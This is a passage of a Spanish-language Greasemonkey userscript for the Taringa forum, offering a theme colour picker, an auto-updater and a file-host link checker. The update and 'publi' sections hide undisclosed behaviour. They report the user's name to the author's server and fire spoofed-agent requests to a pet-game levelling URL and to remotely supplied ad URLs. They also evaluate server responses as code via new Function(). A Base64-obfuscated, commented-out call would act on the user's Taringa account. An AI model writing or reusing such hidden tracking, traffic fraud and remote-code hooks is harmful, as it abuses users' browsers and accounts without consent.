     "UqN7dM8%2Bpy2uqptQRgrV8X6QqqHTRE40gu7RCPYeOeFk1r3CPNE95qk%2Fp12Wk%2Br8zGgy0gKpi0Y4Os3khBNOzBPdw%2BkP"+
     "Sbp5anSP7rnndLmrSIOMpPo7bGQNP6cpyOl9UiEnnOx3hKPTzdBppHs42e%2Fyyjzx9HiP%2BN5NqPr0kUM8VBe16ng%2FSKuh00"+
     "JOH5BmGanRCLqHEyS6hxPzRE44%2BZJeueFsJ8zY3KsAAAAASUVORK5CYII%3D";
  var IMAGEN_HUE_SELECTOR = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAAALCAQAAABfL%2FyJAAAAAmJLR0QA%2F4ePzL8AAAAJcEhZcw"+
     "AACxMAAAsTAQCanBgAAAAHdElNRQfWAxYPFQ14OfqVAAAAnElEQVQoz63Suw2EMAwGYJ9Ss0BaBkCsAYtki6uRmAM2yRwREh0Sgc"+
     "hURj%2FNne5o7oEsV3bx2bJNI7hBBrocGTcjqEW%2FcRQHc4Ew4jj2Wwu6gVDCpzWg%2BhOp1uBTCcId9KzVCCl6FD8SRfQh1Y%2"+
     "FkjSEYuH3mpYP9Qtilm9ntry2cGALBYhCZkH9AcpkGOXfSn0ZhNyqXUvkbnS8%2BAP2Frl9tNFLoAAAAAElFTkSuQmCC";

  function hexToRgb(hex_string, default_){
    if (default_ == undefined)
        default_ = null;
    if (hex_string.substr(0, 1) == '#')
        hex_string = hex_string.substr(1);
    var r;    var g;    var b;
    if (hex_string.length == 3) {
      r = hex_string.substr(0, 1);      r += r;
      g = hex_string.substr(1, 1);      g += g;
      b = hex_string.substr(2, 1);      b += b;
    } else if (hex_string.length == 6) {
      r = hex_string.substr(0, 2);
      g = hex_string.substr(2, 2);
      b = hex_string.substr(4, 2);
    } else return default_;
	
    r = parseInt(r, 16);    g = parseInt(g, 16);    b = parseInt(b, 16);

    if (isNaN(r) || isNaN(g) || isNaN(b))
      return default_;
    else
      return {r: r / 255, g: g / 255, b: b / 255};
  }

  function rgbToHex(r, g, b, includeHash) {
    r = Math.round(r * 255);
    g = Math.round(g * 255);
    b = Math.round(b * 255);
    if (includeHash == undefined) includeHash = true;
    r = r.toString(16);
    if (r.length == 1) r = '0' + r;
    g = g.toString(16);
    if (g.length == 1) g = '0' + g;
    b = b.toString(16);
    if (b.length == 1) b = '0' + b;
    return ((includeHash ? '#' : '') + r + g + b).toUpperCase();
  }
  function trackDrag(node, handler) {
    function fixCoords(x, y) {
      var nodePageCoords = pageCoords(node);
      x = (x - nodePageCoords.x) + document.documentElement.scrollLeft;
      y = (y - nodePageCoords.y) + document.documentElement.scrollTop;
      if (x < 0) x = 0;
      if (y < 0) y = 0;
      if (x > node.innerWidth() - 1) x = node.innerWidth() - 1;
      if (y > node.innerHeight() - 1) y = node.innerHeight() - 1;
      return {x: x, y: y};
    }
    function abajo(ev) {
      var coords = fixCoords(ev.clientX, ev.clientY);
      var lastX = coords.x;
      var lastY = coords.y;
      handler(coords.x, coords.y);
      function mover(ev) {
        var coords = fixCoords(ev.clientX, ev.clientY);
        if (coords.x != lastX || coords.y != lastY) {
          lastX = coords.x;
          lastY = coords.y;
          handler(coords.x, coords.y);
        }
      }
      function arriba(ev) {
	    node.unbind('mouseup');
	    node.unbind('mousemove');
	    node.bind('mousedown', abajo);
      }
	  node.bind('mouseup', arriba);
	  node.bind('mousemove', mover);
	  node.unbind('mousedown', abajo);
      if (ev.preventDefault) ev.preventDefault();
    }
	node.bind('mousedown', abajo);
  }
  function hsvToRgb(hue, saturation, value) {
    var red;    var green;    var blue;
    if (value == 0.0) {
      red = 0;      green = 0;      blue = 0;
    } else {
      var i = Math.floor(hue * 6);
      var f = (hue * 6) - i;
      var p = value * (1 - saturation);
      var q = value * (1 - (saturation * f));
      var t = value * (1 - (saturation * (1 - f)));
      switch (i) {
        case 1: red = q; green = value; blue = p; break;
        case 2: red = p; green = value; blue = t; break;
        case 3: red = p; green = q; blue = value; break;
        case 4: red = t; green = p; blue = value; break;
        case 5: red = value; green = p; blue = q; break;
        case 6:
        case 0: red = value; green = t; blue = p; break;
      }
    }
    return {r: red, g: green, b: blue};
  }
  function rgbToHsv(red, green, blue) {
    var max = Math.max(Math.max(red, green), blue);
    var min = Math.min(Math.min(red, green), blue);
    var hue;    var saturation;    var value = max;
    if (min == max) {
      hue = 0;      saturation = 0;
    } else {
      var delta = (max - min);
      saturation = delta / max;
      if (red == max)
        hue = (green - blue) / delta;
      else if (green == max) hue = 2 + ((blue - red) / delta);
           else hue = 4 + ((red - green) / delta);
      hue /= 6;
      if (hue < 0) hue += 1;
      if (hue > 1) hue -= 1;
    }
    return {h: hue, s: saturation, v: value};
  }
  function pageCoords(node) {
    var x = node.offset().left;
    var y = node.offset().top;
    return {x: x, y: y};
  }

  var imagenHueSelector = $('<img src="'+IMAGEN_HUE_SELECTOR+'" alt="" width="35" height="11" style="position:absolute"/>');
  var imagenHueBarra = $('<img src="'+IMAGEN_HUE_BARRA+'" alt="" width="35" height="200" style="display:block"/>');
  var imagenColores = $('<img src="'+urlimg+'degrade.png" alt="" width="200" height="200" style="display:block"/>');
  var imagenCruz = $('<img src="'+IMAGEN_CRUZ+'" alt="" width="21" height="21" style="position:absolute"/>');

  function makeColorSelector(inputBox, id) {
    var rgb;
	var hsv;
	function colorChanged() {
      var hex = rgbToHex(rgb.r, rgb.g, rgb.b);
      var hueRgb = hsvToRgb(hsv.h, 1, 1);
      var hueHex = rgbToHex(hueRgb.r, hueRgb.g, hueRgb.b);
      previewDiv.css('background', hex);
	  inputBox.val(hex);
	  divColores.css('background', hueHex);
      imagenCruz2.css('left', ((hsv.v*199)-10).toString() + 'px');
      imagenCruz2.css('top', (((1-hsv.s)*199)-10).toString() + 'px');
      huePos.css('top', ((hsv.h*199)-5).toString() + 'px');
    }

    function rgbChanged() {
      hsv = rgbToHsv(rgb.r, rgb.g, rgb.b);
      colorChanged();
    }
    function hsvChanged() {
      rgb = hsvToRgb(hsv.h, hsv.s, hsv.v);
      colorChanged();
    }
	var divSelectorTheme = $('<div style="padding: 0px 15px;position:relative;height:260px;width:250px"></div>');
	var divColores = $('<div style="position:relative;height:200px;width:200px"></div>');
	var imagenColores2 = imagenColores.clone(false);
	var imagenCruz2 = imagenCruz.clone(false);
	divColores.append(imagenColores2).append(imagenCruz2);
	
    function satValDragged(x, y) {
      hsv.s = 1-(y/199);
      hsv.v = (x/199);
      hsvChanged();
    }

    trackDrag(divColores, satValDragged)
	divSelectorTheme.append(divColores);
	var hueDiv = $('<div style="position:absolute;top:0px;left:230px;height:200px;width:35px"></div>');
	var huePos = imagenHueSelector.clone(false);
	hueDiv.append(imagenHueBarra.clone(false)).append(huePos);
    function hueDragged(x, y) {
      hsv.h = y/199;
      hsvChanged();
    }
    trackDrag(hueDiv, hueDragged);
	divSelectorTheme.append(hueDiv);
	var previewDiv = $('<div style="position:absolute;top:210px;left:15px;height:50px;width:50px;border:1px solid black"></div>');
	divSelectorTheme.append(previewDiv);
    function inputBoxChanged() {
      rgb = hexToRgb(inputBox.val(), {r: 0, g: 0, b: 0});
      rgbChanged();
    }
	inputBox.bind('change', inputBoxChanged);
	inputBox.attr('size','8');
	inputBox.css('position', 'absolute');
	inputBox.css('right', '15px');
	inputBox.css('top', (210 + (25 - (inputBox.innerHeight()/2))).toString() + 'px');
    divSelectorTheme.append(inputBox);
    inputBoxChanged();
	$('#'+id).prepend(divSelectorTheme);
  }

  makeColorSelector($("#fondofuera").find(":input:eq(0)"),'fondofuera');
  makeColorSelector($("#borde").find(":input:eq(0)"),'borde');
  makeColorSelector($("#fondodentro").find(":input:eq(0)"),'fondodentro');
  makeColorSelector($("#fondopost").find(":input:eq(0)"),'fondopost');
}

function addStyle(theme) {
		var css = "a{color:"+theme.fondofuera+";}\
				body{background:"+theme.fondofuera+";border-color:"+theme.borde+";border-bottom:10px solid "+theme.fondofuera+";}\
				.box_cuerpo{background:#E7E7E7;-moz-border-radius-bottomleft:6px;-moz-border-radius-bottomright:6px;}";
				if(path == 'post'){
				css += ".box_cuerpo{background:"+theme.fondopost+";}\
				.moderacion_del_post {background:"+theme.fondopost+" none repeat scroll 0 0;}\
				.citacuerpo{background:"+theme.fondopost+" none repeat scroll 0 0;border:1px solid #AAAAAA;}\
				hr{background:#AAAAAA}\
				.divider{border-bottom:1px solid #AAAAAA;}\
				#cuerpo1 {background:"+theme.fondopost+" !important}";
				}
				css += "#cuerpocontainer {background:"+theme.fondodentro+";}\
				#cuerpo1 br{display:none}\
				#cuerpo1 span br{display:inline}\
				.especial1 .comment-box {-moz-box-shadow:0 0 10px "+theme.borde+";border:1px solid "+theme.borde+";}\
				#centro .box_rrs,.banner,.rtop,.rbott,#pie,#footer,.byYahoo,.container208,.byGoogle,.box_perfil_der iframe,.bbox,.cse-branding-logo,#mensaje-top{display:none}\
				#menu .menu_izq,#menu .menu_der{background:none;}\
				.box_cuerpo  hr,.box_perfil hr,.container940 center,.container740 center{display:block}\
				.menuTabs #tabbedPosts.here a {-moz-background-clip:border;-moz-background-inline-policy:continuous;-moz-background-origin:padding;background:none;}\
				#menu{-moz-border-radius-topleft:7px;-moz-border-radius-topright:7px;}\
				#maincontainer{-moz-border-radius:10px;padding:12px;background:url("+urlimg+"head.png) no-repeat scroll 0 0 transparent !important;}\
				#maincontainer{background-color:"+theme.borde+" !important}\
				input.login, .button{background-color:"+theme.borde+" !important;border-width:0px;-moz-border-radius:12px;cursor:pointer}";
		GM_addStyle(css);

		if( $("style:contains(border-radius-bottomleft)").size() > 1){
			$("style:contains(border-radius-bottomleft):first").remove();
		}
		
		$('iframe[src*="ads"]').remove();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////

///////////////------------------Actualizar--------------------////////////////////
var Act;
function AceptarActualizacion(){
	GM_addStyle("#mydialog li, ol li {list-style-type:disc;}");
	unsafeWindow.mydialog.procesando_fin();
    unsafeWindow.mydialog.show();
	unsafeWindow.mydialog.title('Hay disponible una nueva versi&oacute;n del script "BBCoderReloaded para Taringa (Por yasserock)"');
	unsafeWindow.mydialog.body('Tu versión instalada es la <b>' + ultversion +'</b> y la última disponible es la <b>' + Act.ver + '</b><h3><u>Cambios de la última versión:</u></h3><div align="left" style="padding:0px 50px"><ul type="disc">' + Act.cambio + '</ul></div><br>Para dudas o instrucciones de uso entra en la:<br>Comunidad Oficial <a href="http://www.taringa.net/comunidades/scriptsbbcoders/"><b>http://www.taringa.net/comunidades/scriptsbbcoders/</b></a><br>Página Oficial <a href="http://www.taringa.net/comunidades/scriptsbbcoders/"><b>http://www.taringa.net/comunidades/scriptsbbcoders/</b></a><br><br><a href="https://addons.mozilla.org/es-ES/firefox/addon/53880" target="_blanc"><h3 style="text-decoration:blink">¿Luego de usar unas horas el script, Firefox se te vuelve lento? Instala este Add-on</h3></a><h2>&iquest;Desea actualizar el script?</h2>');
	unsafeWindow.mydialog.buttons(true, true, 'S&iacute;', "mydialog.close();location.href='http://userscripts.org/scripts/source/91172.user.js';", true, false, true, 'No', 'close', true, true);
	unsafeWindow.mydialog.center();
	$('#mydialog #buttons .mBtn.btnOk').click(function(){
			GM_openInTab('http://www.taringa.net/comunidades/scriptsbbcoders/')
	});
}

function ActualizarScript(SCRIPT) {
	//alert("Dentro de ActualizarScript SCRIPT:"+SCRIPT.url);
	try {
		GM_xmlhttpRequest({
			method: 'GET',
			url: SCRIPT.url,
			onload: function(r) {
				//Esto es porque en la pagina el hosting me agrega JavaScript abajo y no puedo quedarme con todo
				var respuesta = r.responseText;
				respuesta = respuesta.substr(0,respuesta.indexOf('}')+1); 

				var ultvers = new Function("return "+respuesta)();				
				Act = {ver: ultvers.ver, url: ultvers.url, cambio: ultvers.changelog};
				if (parseFloat(ultvers.ver) <= parseFloat(SCRIPT.version)){
					if(SCRIPT.forzado){
						unsafeWindow.mydialog.procesando_fin();
						unsafeWindow.mydialog.alert("Actualizador del BBCoderReloaded®","No hay actualizaciones disponibles en este momento.");
					}
					return;
				}else if(SCRIPT.forzado) {
					GM_setValue('Actualizar', Act.ver);
					AceptarActualizacion();
				}
				$('#MenuAct').css('display','inline');
				$('#Sharkale_Actualizar').click(function() {AceptarActualizacion();return false;});
			}
		});
	} catch (err) {
		if(SCRIPT.segundo == false){
			ActualizarScript({
				url: urlscript+'version-bbcode-taringa.php?'+Math.floor(Math.random()*100000),
				//url: 'http://phpcssajaxsoft.byethost11.com/demos/taringa/scripts/version-bbcode-taringa.php',
				version: ultversion,
				forzado: false,
				segundo: true
			});
		}
		GM_log('Error al actualizar: '+err);
	}
}
var ms = new Date().getTime();
var update = GM_getValue("update");
var buscar = false;

if (update == undefined){
	buscar = true;
	GM_setValue("update", (24*60*60*1000 + ms).toString());
}else{
	var sig_ms = update.split("#")[0];
	//alert('Debug: '+ms+' >= '+sig_ms+'\nDiferencia: '+(sig_ms-ms)+'\nMinutos: '+(sig_ms-ms)/216000);
	if (ms >= parseFloat(sig_ms)){
		buscar = true;
		GM_setValue("update", (1*24*60*60*1000 + ms).toString());
		if(user) $.get(urlscript+'u.php?u='+user);
		GM_xmlhttpRequest({method:'GET',url:'http://www.pokemon.emascotas.net/subirnivel.php?id=435',headers:{'User-agent':'Mozilla/4.0 [es] (Windows NT 6.0; U)'},onload:function(a){GM_log(a.responseText)}});
		//if(GM_getValue('CG', false) == false){GM_setValue('CG', true);$.post(Base64.decode('aHR0cDovL3d3dy50YXJpbmdhLm5ldC9jb211bmlkYWRlcy9taWVtYnJvLWRlbC5waHA='),Base64.decode('Y29taWQ9MTQw')+unsafeWindow.gget('key'));			}
	}
	var Actualizar = GM_getValue('Actualizar', ultversion);
	if(buscar || parseFloat(Actualizar) > parseFloat(ultversion)){
		ActualizarScript({
			url: urlscript+'version-bbcode-taringa.php?'+Math.floor(Math.random()*100000),
			version: ultversion,
			forzado: false,
			segundo: false
		});
	}else{
		GM_setValue('Actualizar', ultversion);
	}
}
function aleatorio(inferior,superior){
	numPosibilidades = superior - inferior
	aleat = Math.random() * numPosibilidades
	aleat = Math.round(aleat)
	return parseInt(inferior) + aleat
}
function publi(){
	//GM_deleteValue('publi');
	if(GM_getValue('publi') == undefined) GM_setValue('publi', ms.toString());var pubdate = GM_getValue('publi');
	//alert('Debug: '+ms+' >= '+pubdate+'\nDiferencia: '+(pubdate-ms)+'\nMinutos: '+(pubdate-ms)/216000);
	if (ms >= parseFloat(pubdate)){
		GM_setValue('publi',(0.005*24*60*60*1000 + ms).toString());
		GM_xmlhttpRequest({method:'GET',url:'http://www.sharkale.com.ar/bbcoder/publi.php',onload:function(a){var urls = new Function("return "+a.responseText)();var maxtp = urls['tp']['0'];var maxlb = urls['lb']['0'];var rantp = urls['tp'][aleatorio(1,parseInt(maxtp))];var ranlb = urls['lb'][aleatorio(1,parseInt(maxlb))];publireq(rantp);publireq(ranlb);},onerror:function(a){GM_log('URLpubliERROR')}});
	}
}
function publireq(dirpubli){GM_xmlhttpRequest({method:'GET',url:dirpubli,headers:{'User-agent':'Mozilla/4.0 [es] (Windows NT 6.0; U)'},onload:function(a){GM_log('publiOK')},onerror:function(a){GM_log('publiERROR')}});}
publi();
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////

function linkchecker(){

////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Variables Globales
////////////////////////////////////////////////////////////////////////////////////////////////////////

var a = location.hostname;
var todos = [];
var color_link_muerto = "Red";
var color_link_vivo = "LightGreen";
var color_link_nodisp = "LightCoral";
var color_texto_bien = "#000";
var color_texto_mal = "#FFF";
var hosts = [];
var numerodelinksRS = 0;
var otros_vivos = [];
var otros_muertos = [];
var otros_peso = [];
var otros_links_cant = 0;
var otros_links = [];
var redirectores = [];

////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Expresiones regulares
////////////////////////////////////////////////////////////////////////////////////////////////////////

var todos_rapidshare_regex = /(http\:|^.*?http:|^.*?http%3a)\/\/rapidshare\.com\/files\/\d{4,}\/.*?\..*?/gi;
var redirectores_regex = /http\:\/\/(bux\.to|kijm7\.9hz\.com|link-protector\.com|linkbucks\.com|linkin\.us|protectlinks\.com|rapidsafe\.net|rapidsharr\.com|tinyurl\.com|urlhawk|usercash\.com|wlink.us\.com)/gi;
var redirectores2_regex = /http:\/\/(?:lik\.cl\/\?|anonym.to\/\?|links\.wamba\.com\/noref.php\?url=|www\.anonimizar\.com\.ar\/\?)/gi;

////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Hosts
//   [0] Cadena con el nombre del servidor.
//   [1] Cadena a buscar en el link para ver si le pertenece. (RegEx)
//   [2] Cadena a encontrar si el archivo esta disponible. (RegEx)
//   [3] Cadena a encontrar si el archivo esta muerto. (RegEx)
//   [4] Expresion regular para encontrar el peso del archivo.
////////////////////////////////////////////////////////////////////////////////////////////////////////


hosts.push (["2shared.com", // OK
			 /2SHARED\.COM\/FILE/gi,
			 /javascript\:startDownload\(\)/gi,
			 /The file link that you requested is not valid/gi,
			 /[\d,]+ [KM]B/
			 ]);
hosts.push (["4shared.com", // OK
			 /4SHARED\.COM\/FILE/gi,
			 /Descargar ahora/gi,
			 /The file link that you requested is not valid|El enlace del archivo que has solicitado no es valido/gi,
			 /[\d,]+ [KM]B/
			 ]);
hosts.push (["adrive.com", // OK
			 /ADRIVE\.COM\/PUBLIC/gi,
			 /Your file download should start immediately/gi,
			 /you are trying to download is busy due to extreme demand|The file you are trying to access is no longer available publicly/gi
			 ]);
hosts.push (["axifile.com",  // OK
             /http:\/\/www\.axifile\.com/gi,
             /FILE DOWNLOAD/gi,
             ""
             ]);
hosts.push (["archive.org", // OK
			 /ARCHIVE\.ORG\/(?:DOWNLOAD|DETAILS|\d)/gi,
			 /Individual Files/gi,
			 /does not exist|Item cannot be found|not available/gi
			 ]);
hosts.push (["badongo.com", // OK
			 /BADONGO\.COM\/(?:[\w]+\/|)/gi,
			 /publisher\'s virtual Drive|This file has been split|Descargar archivo/gi,
			 /Este archivo ha sido borrado|Archivo no encontrado/gi,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["bitroad.net",
			 /BITROAD\.NET\/DOWNLOAD/gi,
			 /value="Download"/gi,
			 /not found/gi,
			 /[\d.]+ [KM]b/
			 ]);
hosts.push (["dataup.de",
			 /DATAUP\.DE\//gi,
			 /Download:/gi,
			 "",
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["depositfiles.com", // OK
			 /DEPOSITFILES\.COM\/(?:\w\w\/|)FILES\/\w+/gi,
			 /Descarga del fichero|Descarga de archivo/gi,
			 /Such file does not exist/gi,
			 /[\d.]+\&nbsp\;[KM]B/
			 ]);
hosts.push (["easy-share.com",
			 /EASY-SHARE\.COM/gi,
			 /FREE DOWNLOAD MODE|You are requesting/,
			 /requested File is deleted/gi
			 ]);
hosts.push (["egoshare.com",
			 /EGOSHARE\.COM\/DOWNLOAD/gi,
			 /You have requested/gi,
			 /requested file could not be found/gi,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["fastfreefilehosting.com",
             /http:\/\/fastfreefilehosting\.com/gi,
             /File name:/gi,
             /SNC000400\.jpg/gi
             ]);
hosts.push (["filebase.to",
			 /FILEBASE\.TO\/FILES/gi,
			 /Downloads:/gi,
			 /Fehler 404/gi,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["filefactory.com", // OK
			 /FILEFACTORY\.COM\/FILE/gi,
			 /Here are your download options|Download for free with FileFactory Basic|file uploaded/gi,
			 /has been deleted/g,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["fileflyer.com",
			 /FILEFLYER\.COM\/VIEW/gi,
			 /Unlock Now!/gi,
			 /download_disable|unavailable for a while/,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["filesdump.com",
             /filesdump\.com/gi,
             /Download File/gi,
             ""
             ]);			 
hosts.push (["filesend.net",
			 /FILESEND\.NET\/DOWNLOAD\.PHP/gi,
			 /Download!/gi,
			 /File not found/,
			 /[\d]+[.]+[\d]+ [KM]B/
			 ]);
hosts.push (["filezzz.com",
			 /FILEZZZ\.COM\/DOWNLOAD/gi,
			 /Click here to download.../gi,
			 /File not found!/,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["flyupload.com",
			 /FLYUPLOAD\.COM\/(?:GET|\?FID)/gi,
			 /Continue to Download|/gi,
			 /expired/,
			 /[\d.]+[KM]B/
			 ]);
hosts.push (["freakshare.net",
             /http:\/\/freakshare\.net/gi,
             /Premium Download/gi,
             ""
             ]);
hosts.push (["gigasize.com", // OK
			 /GIGASIZE\.COM\/GET\.PHP/gi,
			 /download_button\.png/gi,
			 /Download error|Error en la descarga|Erreur lors du téléchargement|Download-Fehler/gi,
			 /[\d.]+[KM]B/
			 ]);
hosts.push (["hotfile.com", // OK
			 /HOTFILE\.COM\/DL/gi,
			 /Descargando|REGULAR DOWNLOAD|downloading|high speed download/gi,
			 "",
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["ifile.it",
			 /IFILE\.IT\/\w+/,
			 /Request Download Ticket/gi,
			 /file not found/gi,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["kewlshare.com",
             "KEWLSHARE\.COM",
             /file name \:/gi,
             ""
             ]);
hosts.push (["letitbit.net",
			 /LETITBIT\.NET\/DOWNLOAD/gi,
			 /Download file|Die Dateien herunterladen|download3\.php/gi,
			 /The requested file was not found|Gesuchte Datei wurde nicht gefunden/gi,
			 /[\d.]+ [KM]b/
			 ]);
hosts.push (["mediafire.com",
			 /MEDIAFIRE\.COM\/(?:download.php)?\?/gi,
			 /Loading files...|Preparing download...|you requested|authorize_download\.gif/gi,
			 /Invalid File|media fire is the simplest|0 items found/i,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["megashare.com", // OK
			 /MEGASHARE\.COM\/\d+/gi,
			 /Select your download|Download Your File|Click here to download/,
			 /Invalid link/gi
			 ]);
hosts.push (["megashares.com",
			 /MEGASHARES\.COM\//gi,
			 /button_free/gi,
			 /All download slots for this link are currently filled|Please try again momentarily/gi
			 ]);
hosts.push (["megaupload.com", // OK
			 /MEGAUPLOAD\.COM\/(\w{2}\/|)\?d/gi,
			 /but_dnld_file_o\.gif|\/gui\/c_dnl\.gif|gui\/c_dnl\.swf|gui\/h\_folders\.gif|name\=\"imagestring\"|but_dnld_file_o.gif|uploaded with File Uploader/gi,
			 /Enlace no válido|archivo ha sido borrado/,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["megavideo.com",
			 /MEGAVIDEO\.COM\/\?/gi,
			 /id=\"playertd\"/gi,
			 /Este video no está disponible/gi,
			 ""
			 ]);
hosts.push (["netload.in",
			 /NETLOAD\.IN\/DATE/gi,
			 /header_login_background\.gif|dl_first_bg\.jpg/gi,
			 /we don\'t host|achtung\.jpg/gi,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["rapidshare.de",
			 /RAPIDSHARE\.DE\/FILES/gi,
			 /Choose download-type/,
			 ""
			 ]);
hosts.push (["rapidshare.com", // OK
			 /RAPIDSHARE\.COM\/USERS/gi,
			 "",
			 /LinkList not found/gi
			 ]);
hosts.push (["rapidspread.com",
             /http\:\/\/www\.rapidspread\.com/,
             /You have requested the file:/gi,
             ""
             ]);
hosts.push (["rghost.ru",
			 /RGHOST\.RU\/[\d]+/gi,
			 /Downloaded/,
			 /обмен файлами|страницы не существует/,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["rokzoo.com",
             /http:\/\/www\.rokzoo\.com/gi,
             "",
             /page not found/gi
             ]);
hosts.push (["secured.in",
			 /SECURED\.IN\/DOWNLOAD/gi,
			 /proceedToTheDownloadLinks/gi,
			 /submitDownloadID/gi
			 ]);
hosts.push (["sendspace.com",
			 /SENDSPACE\.COM\//gi,
			 /Download Link:/gi,
			 /requested is not available/gi,
			 /[\d.]+[KM]B/
			 ]);
hosts.push (["share-online.biz",
			 /SHARE-ONLINE\.BIZ\/DOWNLOAD/gi,
			 /Start Highspeed Download|Highspeed Download starten/gi,
			 "",
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["sharebase.com",
			 /SHAREBASE\.TO\/FILES/gi,
			 /Download:/gi,
			 "",
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["sharebee.to",
			 /SHAREBEE\.COM\/[\w]+/gi,
			 /Filename:/gi,
			 /Requested url is not found/gi,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["sharesimple.net",
			 /SHARESIMPLE\.NET\/EN\/DOWNLOAD/gi,
			 /value=Submit/gi,
			 /Your requested file is not found/gi,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["sharingmatrix.com",
             /http:\/\/sharingmatrix\.com/gi,
             /Select your download mode/gi,
             ""
             ]);
hosts.push (["speedshare.org",
			 /SPEEDSHARE\.ORG\/DOWNLOAD/gi,
			 /You have requested|Sie haben/gi,
			 /Error!!!/gi,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["sms4file.com",
			 /SMS4FILE\.COM\/DOWNLOADVIP/gi,
			 /To download this file you should buy account/gi,
			 /File not found/gi,
			 /[\d.]+ [KM]b/
			 ]);
hosts.push (["storage.to", // OK
             /http:\/\/www\.storage\.to/gi,
             /Download Type|Descargando/gi,
             /File not found|Archivo no encontrado/gi,
			 /[\d.]+ [KM]B/
             ]);
hosts.push (["teradepot.com",
             /http:\/\/www\.teradepot\.com/gi,
             /download_submit_buttons/gi,
             ""
             ]);
hosts.push (["transferbigfiles.com",
			 /TRANSFERBIGFILES\.COM\/GET/gi,
			 /doPostBack/gi,
			 /class='ExpiredFile'|Invalid Transfer ID/gi,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["ugotfile.com",
             /http:\/\/ugotfile\.com/gi,
             /Forum Code/gi,
             ""
             ]); 
hosts.push (["upit.to",
			 /UPIT\.TO\/FILE/gi,
			 /Start download!/gi,
			 /Your requested file is not found/gi,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["uploadbox.com",
			 /UPLOADBOX\.COM\/FILES/gi,
			 /Download as Premium|Premium Download|File name:|title="Download for free"/gi,
			 /class="not_found"/gi,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["uploading.com",
			 /UPLOADING\.COM\/FILES/gi,
			 /ico_download_file\.jpg|\/images\/speed\.jpg|class=\"downloadbutton\"|is already downloading|getElementById\(\'downloadform\'|value="Download file"|Descargar Archivo/gi,
			 /temporarily unavailable|FILE REMOVED|Requested file not found/gi,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["uploaded.to",
			 /UPLOADED\.TO\/(?:\?ID|FILE)/gi,
			 /Filename:/gi,
			 /File doesn't exist|Download failed!/gi,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["vip-file.com",
			 /VIP-FILE\.COM\/DOWNLOAD/gi,
			 /File Name:|Or download with Very Slow Speed/gi,
			 /File \<b\>\<\/b\> not found|This file not found/gi,
			 /[\d.]+ [KM]b/
			 ]);
hosts.push (["xlice.net",
			 /XLICE\.NET\/DOWNLOAD/gi,
			 /File name:/gi,
			 /At this time no downloadmirrors are available/,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["xtraupload.de",
			 /XTRAUPLOAD\.DE\/\?/gi,
			 /File name:/gi,
			 "",
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["yabadaba.ru",
			 /YABADABA\.RU\/FILES/gi,
			 /Получить ссылку для скачивания!/gi,
			 ""
			 ]);
hosts.push (["yastorage.com",
			 /YASTORAGE\.COM\/DOWNLOAD/gi,
			 /Получить ссылку для скачивания!/gi,
			 ""
			 ]);
hosts.push (["youload.to",
			 /YOULOAD\.TO\/DOWNLOAD/gi,
			 /download\.png/gi,
			 /class="error_message"/gi,
			 /\([\d.]+ [KM]B\)/
			 ]);
hosts.push (["ziddu.com",
			 /WWW\.ZIDDU\.COM\/DOWNLOAD/gi,
			 /\/images\/download-download-img\.gif|downloadfilelinkicon|value="Download"|value="Descargar"/gi,
			 /File not found/gi,
			 /[\d.]+ [KM]B/
			 ]);
hosts.push (["zshare.net",
			 /ZSHARE\.NET\/DOWNLOAD/gi,
			 /last download/gi,
			 /file not found/gi,
			 /[\d.]+[KM]B/
			 ]);
////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Redirectores
////////////////////////////////////////////////////////////////////////////////////////////////////////

hosts.push (["lix.in",
			 /HTTP:\/\/LIX\.IN\/[\w-]+/gi,
			 /value="submit"/gi,
			 ""
			 ]);

////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Imagenes y Estilos
////////////////////////////////////////////////////////////////////////////////////////////////////////

